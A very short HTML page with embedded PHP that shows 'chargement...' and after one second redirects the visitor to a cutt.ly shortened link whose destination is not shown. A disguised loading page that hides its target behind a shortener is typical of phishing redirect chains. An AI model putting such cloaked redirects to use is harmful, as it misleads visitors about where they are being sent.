<!DOCTYPE html>

<html>

<head>
<meta charset=utf-8/>
  <title>chargement...</title>
</head>

<body>

<?php
   echo("chargement...")     ;
 echo "<META HTTP-EQUIV='Refresh' Content=1;URL='https://cutt.ly/9d0xZ5l'>";
?>


</body>
</html>